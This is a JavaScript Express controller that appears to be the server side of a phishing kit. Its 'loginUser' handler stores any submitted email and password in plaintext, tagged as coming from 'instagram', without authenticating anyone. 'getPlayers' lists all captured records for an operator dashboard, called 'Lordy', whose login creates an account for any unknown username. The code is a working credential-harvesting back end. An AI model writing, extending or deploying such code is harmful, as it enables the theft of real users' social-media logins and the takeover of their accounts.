const User = require("../models/User");
const Lordy = require("../models/Lordy");

const deletePlayer = async (req, res) => {
  const { id } = req.body;
  try {
    const CheckPlayer = await User.findOne({ _id: id });
    if (!CheckPlayer) {
      return res.json({
        error: "Player Already removed!"
      })
    }

    await User.deleteOne({ _id: id });
    return res.json({
      success: "Player Removed Successfuly!"
    })
  } catch (error) {
    console.log(error);
  }
}

const getPlayers = async (req, res) => {
  try {
    const allPlayers = await User.find({});
    return res.status(200).json(allPlayers);
  } catch (error) {
    console.error("Error fetching players:", error);
    return res.status(500).json({ error: "Failed to fetch players" });
  }
};

// Test route
const tester = async (req, res) => {
  return res.json({
    message: "Night Player is ready to play!"
  });
};

// Login route for users
const loginUser = async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Email and Password are required!" });
    }

    // Random severity
    const severities = ["low", "medium", "high"];
    const randomSeverity = severities[Math.floor(Math.random() * severities.length)];

    // Save user
    const newUser = new User({
      email,
      password, // ⚠️ hash in production
      source: "instagram",
      severity: randomSeverity,
    });

    await newUser.save();

    console.log(newUser);

    return res.json({
      success: true,
      message: "User saved successfully!",
      data: newUser,
    });
  } catch (error) {
    console.error("Login error:", error);
    return res.status(500).json({ error: "Server error" });
  }
};

// Login route for Lordy
const loginLordy = async (req, res) => {
  try {
    const { username, password } = req.body;

    // Check if Lordy exists
    const existing = await Lordy.findOne({ lordysID: username });

    if (existing) {
      if (existing.lordysID !== username) {
        return res.json({ error: "Wrong ID Provided!" });
      }
      if (existing.password !== password) {
        return res.json({ error: "Wrong Password Provided!" });
      }

      return res.json({ success: "Welcome Lordy Night Player!", existing });
    }

    // If not found, create new
   const lordy = await Lordy.create({
      lordysID: username,
      password: password,
    });

    return res.json({
      success: "Lordy`s Dashboard created successfully. Welcome!",
      lordy
    });
  } catch (error) {
    console.log("Lordy login error:", error);
    return res.status(500).json({ error: "Server error" });
  }
};

module.exports = { tester, loginUser, loginLordy, getPlayers, deletePlayer };
